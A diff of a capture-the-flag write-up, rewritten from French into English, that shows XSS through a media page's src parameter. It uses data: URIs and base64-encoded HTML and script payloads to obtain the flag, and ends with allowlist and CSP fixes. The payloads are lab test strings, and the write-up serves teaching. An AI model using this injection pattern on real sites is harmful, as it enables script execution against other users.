@@ -1,26 +1,27 @@
 Context:
+XSS happens when the browser interprets user-controlled content.
+On /index.php?page=media&src=nsa, the src parameter is used as a media source, so I tested whether it could be made to load something other than an intended resource.
 
-Le cross-site scripting (XSS) est une tactique par laquelle un acteur malveillant injecte du code malveillant via un ou plusieurs scripts web dans un site web ou une web application légitime.
-Sur /index.php?page=media&src=nsa, le paramètre src sert de “source” pour charger un contenu (média).
-L’idée est de voir si on peut lui faire charger autre chose qu’une ressource prévue.
+Method:
+1. Test a Data URI (embedded content)
+    A Data URI directly embeds content (a common test when you control src):
+    data:text/plain,hello or data:text/html,<h1>hello</h1>
+    Result: “hello” is displayed → HTML is accepted/interpreted.
 
-Tests effectués:
+2.Switch to base64
+    Raw HTML in a URL can break (<, >, etc.). Base64 is more stable.
+    echo -n '<h1>HELLO</h1>' | base64
+    PGgxPkhFTExPPC9oMT4= then test with:
+    data:text/html;base64,PGgxPkhFTExPPC9oMT4=
+    Result: “HELLO” is displayed.
 
-On test une Data URI, c’est une “URL” qui contient directement le contenu. Classique
-Par exemple :
-data:text/html,<h1>hello</h1>
- ou data:text/plain,hello
-et on voit un hello qui s'affiche, donc le html est accepte
+3.Demonstrate impact
+    I encoded HTML containing a script test:
+    echo -n '<script>test</script>' | base64
+    PHNjcmlwdD50ZXN0PC9zY3JpcHQ+ then injected it via src=data:text/html;base64,...
+    Result: flag obtained.
 
-Base64 :Le HTML brut dans une URL peut casser (caractères spéciaux, encodage, filtrage).
-En base64, la chaîne devient stable (caractères simples), donc plus fiable pour tester.
-
-on encode : echo -n '<h1>HELLO</h1>' | base64
-pon trouve PGgxPkhFTExPPC9oMT4=
-donc on peut tester : data:text/html;base64,PGgxPkhFTExPPC9oMT4=
-
-doooonc, vu que ca fonctionne, on peut tenter d'injecter un script :
-echo -n '<script>test</script>' | base64
-on recupere PHNjcmlwdD50ZXN0PC9zY3JpcHQ+
-donc dans l'URL on met : src=data:text/html;base64,PHNjcmlwdD5hbGVydDwvc2NyaXB0Pg== et on obtient le flag
-
+Fix
+-Validate src using a strict allowlist.
+-Do not let users directly control a browser-loaded source.
+-Reinforce with a Content Security Policy (CSP).
